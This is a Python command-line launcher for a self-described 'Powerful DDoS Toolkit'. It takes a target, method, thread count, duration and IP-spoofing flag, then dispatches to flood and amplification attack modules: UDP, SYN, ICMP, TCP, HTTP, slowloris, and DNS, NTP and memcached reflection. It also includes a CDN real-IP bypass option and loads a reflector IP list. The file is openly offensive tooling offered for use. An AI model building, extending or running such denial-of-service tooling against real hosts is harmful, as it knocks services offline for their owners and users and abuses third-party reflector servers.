#!/usr/bin/env python3
import argparse
import sys
import time
import os
from attacks import udp_flood, syn_flood, icmp_flood, tcp_flood, http_flood, slowloris, dns_amp, ntp_amp, memcached_amp
from core.real_ip import detect_real_ip

def load_memcached_servers():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ip_file = os.path.join(script_dir, "all-ipv4-ClassC-192,168", "all_ip.txt")
    if not os.path.exists(ip_file):
        print(f"[!] File tidak ditemukan: {ip_file}")
        return None
    servers = []
    with open(ip_file, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                servers.append(line)
    print(f"[+] Loaded {len(servers)} server IPs from {ip_file}")
    return servers

def main():
    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit")
    parser.add_argument("--target", required=True, help="Target IP or domain")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--method", required=True,
                        choices=["udp","syn","http","slowloris","dns","ntp","memcached","icmp","tcp"],
                        help="Attack method")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--spoof", action="store_true", help="Enable IP spoofing (requires root)")
    parser.add_argument("--real-ip", action="store_true", help="Detect real IP behind CDN")
    args = parser.parse_args()

    target = args.target
    if args.real_ip:
        real = detect_real_ip(target)
        if real:
            print(f"[+] Real IP detected: {real}")
            target = real
        else:
            print("[!] Real IP not found, using original target")

    print(f"[*] Starting {args.method.upper()} flood on {target}:{args.port}")
    print(f"[*] Threads: {args.threads}, Duration: {args.duration}s, Spoof: {args.spoof}")

    method_map = {
        "udp": udp_flood.attack,
        "syn": syn_flood.attack,
        "icmp": icmp_flood.attack,
        "tcp": tcp_flood.attack,
        "http": http_flood.attack,
        "slowloris": slowloris.attack,
        "dns": dns_amp.attack,
        "ntp": ntp_amp.attack,
    }

    try:
        if args.method == "memcached":
            servers = load_memcached_servers()
            if not servers:
                print("[!] Gagal memuat all_ip.txt")
                sys.exit(1)
            memcached_amp.attack(target, args.port, args.threads, args.duration, args.spoof, servers)
        else:
            method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped")
    except PermissionError:
        print("[!] Root/Admin privileges required for raw socket attacks")

if __name__ == "__main__":
    main()
